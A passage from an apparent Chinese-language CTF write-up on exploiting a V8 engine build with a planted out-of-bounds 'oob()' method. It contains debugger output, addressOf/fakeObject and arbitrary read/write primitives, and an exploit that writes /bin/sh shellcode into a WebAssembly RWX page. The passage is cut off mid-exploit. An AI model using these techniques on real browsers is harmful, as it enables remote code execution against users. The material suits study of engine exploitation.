class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f_addr = <span class="hljs-title function_">addressOf</span>(f);<br><br>%<span class="hljs-title class_">DebugPrint</span>(f);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hex</span>(f_addr));<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br><br><span class="hljs-number">0x07a6bbc611f9</span> &lt;<span class="hljs-title class_">JSFunction</span> <span class="hljs-number">0</span> (sfi = <span class="hljs-number">0x7a6bbc611c1</span>)&gt;<br><br>wasm func <span class="hljs-attr">addr</span>: <span class="hljs-number">0x7a6bbc611f9</span><br></code></pre></td></tr></table></figure><p>使用vmmap命令可以看到这个内存空间 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x2b7465e6a000</span>   <span class="hljs-number">0</span>x2b7465e6b000 rwxp   <span class="hljs-number">1000</span> <span class="hljs-number">0</span>  <span class="hljs-meta"> [anon_2b7465e6a]</span><br></code></pre></td></tr></table></figure><p>这片内存空间肯定是跟我们输出的函数地址是有关联的,因为wasm会在这片空间中执行. </p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; job 0x07a6bbc611f9</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">0x7a6bbc611f9</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[Function] in OldSpace</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">map: 0x123928784379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype: 0x07a6bbc42109 &lt;JSFunction (sfi = 0x2e1f8d0c3b29)&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">elements: 0x39e2f2600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">function prototype: &lt;no-prototype-slot&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">shared_info: 0x07a6bbc611c1 &lt;SharedFunctionInfo 0&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">name: 0x39e2f2604ae1 &lt;String[#1]: 0&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">formal_parameter_count: 0</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">kind: NormalFunction</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">context: 0x07a6bbc41869 &lt;NativeContext[246]&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">code: 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">WASM instance 0x7a6bbc61001</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">WASM function index 0</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">properties: 0x39e2f2600c71 &lt;FixedArray[0]&gt; &#123;</span><br><br> <span class="hljs-comment">#length: 0x2e1f8d0c04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-comment">#name: 0x2e1f8d0c0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-comment">#arguments: 0x2e1f8d0c0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-comment">#caller: 0x2e1f8d0c03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute"> </span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute"> \- feedback vector</span><span class="hljs-punctuation">:</span> <span class="hljs-string">not available</span><br></code></pre></td></tr></table></figure><p>通过fun_addr-&gt;share_info-&gt;data-&gt;instance+0x88这个结构,最终找到的这块内存的起始地址, 或者通过wasmInstance+0x88也可以. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x07a6bbc611c1</span><br><br>0x7a6bbc611c1: [SharedFunctionInfo] in OldSpace<br><br> - map: 0x39e2f26009e1 &lt;Map[56]&gt;<br><br> - name: 0x39e2f2604ae1 &lt;String[#1]: 0&gt;<br><br> - kind: NormalFunction<br><br> - function_map_index: 144<br><br> - formal_parameter_count: 0<br><br> - expected_nof_properties: 0<br><br> - language_mode: sloppy<br><br> - data: 0x07a6bbc61199 &lt;WasmExportedFunctionData&gt;<br><br> - code (from data): 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;<br><br> - function token position: -1<br><br> - start position: -1<br><br> - end position: -1<br><br> - no debug info<br><br> - scope info: 0x39e2f2600c61 &lt;ScopeInfo[0]&gt;<br><br> - length: 0<br><br> - feedback_metadata: 0x39e2f2602a39: [FeedbackMetadata]<br><br> - map: 0x39e2f2601319 &lt;Map&gt;<br><br> - slot_count: 0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> pwndbg&gt; </span><span class="language-bash">job 0x07a6bbc61199</span><br><br> 0x7a6bbc61199: [WasmExportedFunctionData] in OldSpace<br><br> - map: 0x39e2f2605879 &lt;Map[40]&gt;<br><br> - wrapper_code: 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;<br><br> - instance: 0x07a6bbc61001 &lt;Instance map = 0x123928789789&gt;<br><br> - function_index: 0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> pwndbg&gt; </span><span class="language-bash">x/20gx 0x07a6bbc61000</span><br><br>0x7a6bbc61000:  0x0000123928789789  0x000039e2f2600c71<br><br>0x7a6bbc61010:  0x000039e2f2600c71  0x00007f82cc930000<br><br>0x7a6bbc61020:  0x0000000000010000  0x000000000000ffff<br><br>0x7a6bbc61030:  0x0000562dc02eb698  0x000039e2f2600c71<br><br>0x7a6bbc61040:  0x0000562dc036f190  0x000039e2f26004d1<br><br>0x7a6bbc61050:  0x0000000000000000  0x0000000000000000<br><br>0x7a6bbc61060:  0x0000000000000000  0x0000000000000000<br><br>0x7a6bbc61070:  0x0000562dc0371740  0x000039e2f26004d1<br><br>0x7a6bbc61080:  0x0000562dc02e19d0  0x00002b7465e6a000 起始地址<br><br>0x7a6bbc61090:  0x00003c59d768f699  0x00003c59d768f909<br></code></pre></td></tr></table></figure><p>编写泄露这块内存页的代码 </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> instance_addr = addressOf(wasmInstance);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;f_addr:0x&quot;</span>+hex(instance_addr));<br><br><span class="hljs-keyword">var</span> rwx_addr=read64(instance_addr+<span class="hljs-number">0x88</span>n<span class="hljs-number">-0x1</span>n);<br></code></pre></td></tr></table></figure><p>通过ArrayBuffer和DataView可以很方便的处理shellcode,将ArrayBuffer中存储数据的backing_store修改为rwx的内存页 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3d5eba7d0121</span><br><br>0x3d5eba7d0121: [JSArrayBuffer]<br><br> - map: 0x2f9288cc21b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br><br> - prototype: 0x22669038e981 &lt;Object map = 0x2f9288cc2209&gt;<br><br> - elements: 0x0b9b83c00c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]<br><br> - embedder fields: 2<br><br> - backing_store: 0x563b32f3fda0<br><br> - byte_length: 256<br><br> - detachable<br><br> - properties: 0x0b9b83c00c71 &lt;FixedArray[0]&gt; &#123;&#125;<br><br> - embedder fields = &#123;<br><br>  0, aligned pointer: (nil)<br><br>  0, aligned pointer: (nil)<br><br> &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20gx 0x563b32f3fda0</span><br><br>0x563b32f3fda0:  0xcdcccccccccc0040  0x9a99999999990140<br><br>0x563b32f3fdb0:  0x9a99999999990140  0x0000000000000000<br><br>0x563b32f3fdc0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fdd0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fde0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fdf0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe00:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe10:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe20:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe30:  0x0000000000000000  0x0000000000000000<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x3d5eba7d0120</span><br><br>00:0000│ 0x3d5eba7d0120 —▸ 0x2f9288cc21b9 ◂— 0x800000b9b83c001<br><br>01:0008│ 0x3d5eba7d0128 —▸ 0xb9b83c00c71 ◂— 0xb9b83c008<br><br>02:0010│ 0x3d5eba7d0130 —▸ 0xb9b83c00c71 ◂— 0xb9b83c008<br><br>03:0018│ 0x3d5eba7d0138 ◂— 0x100<br><br>04:0020│ 0x3d5eba7d0140 —▸ 0x563b32f3fda0 ◂— 0xcdcccccccccc0040 /* &#x27;@&#x27; */<br><br>05:0028│ 0x3d5eba7d0148 ◂— 0x2<br><br>06:0030│ 0x3d5eba7d0150 ◂— 0x0<br><br>07:0038│ 0x3d5eba7d0158 ◂— 0x0<br></code></pre></td></tr></table></figure><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-keyword">var</span> obj_arr = [obj];<br><br><span class="hljs-keyword">var</span> flo_arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1.1</span>];<br><br><span class="hljs-keyword">var</span> fake_arr=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">var</span> fake_obj=&#123;&#125;;<br><br>obj_arr_map=obj_arr.<span class="hljs-title function_">oob</span>();<br><br>flo_arr_map=flo_arr.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">f</span>)<br><br>&#123;<br><br> f64[<span class="hljs-number">0</span>] = f;<br><br> <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  bigUint64[<span class="hljs-number">0</span>] = i;<br><br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=obj_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(obj_addr);<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-keyword">let</span> ret_data=<span class="hljs-title function_">f2i</span>(fake_obj[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;read addr:0x:&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(ret_data));<br><br>  <span class="hljs-keyword">return</span> ret_data;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr,data</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  fake_obj[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(data);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;write addr:0x&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(data));<br><br>&#125;<br><br> <br><br>fake_arr=[<br><br>  flo_arr_map,<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x41414141n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x1000000000n</span>),<br><br> <span class="hljs-number">1.1</span>,<br><br> <span class="hljs-number">2.2</span><br><br>];<br><br>fake_addr=<span class="hljs-title function_">addressOf</span>(fake_arr);<br><br><span class="hljs-comment">//get elements:value &amp; fake obj</span><br><br><span class="hljs-keyword">var</span> fake_obj_addr=fake_addr-<span class="hljs-number">0x30n</span>;<br><br>fake_obj=<span class="hljs-title function_">fakeObject</span>(fake_obj_addr);<br><br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><br><span class="hljs-keyword">var</span> fun = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-comment">//%DebugPrint(wasmInstance);</span><br><br><span class="hljs-keyword">var</span> instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;f_addr:0x&quot;</span>+<span class="hljs-title function_">hex</span>(instance_addr));<br><br><span class="hljs-keyword">var</span> rwx_addr=<span class="hljs-title function_">read64</span>(instance_addr+<span class="hljs-number">0x88n</span>-<span class="hljs-number">0x1n</span>);<br><br><span class="hljs-keyword">var</span> shellcode = [<br><br> <span class="hljs-number">0x2fbb485299583b6an</span>,<br><br> <span class="hljs-number">0x5368732f6e69622fn</span>,<br><br> <span class="hljs-number">0x050f5e5457525f54n</span><br><br>];<br><br><span class="hljs-keyword">var</span> data_buf=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br><br><span class="hljs-comment">//set ArrayBuffer backing_store</span><br><br><span class="hljs-keyword">var</span> backing_store_addr= <span class="hljs-title function_">addressOf</span>(data_buf)+<span 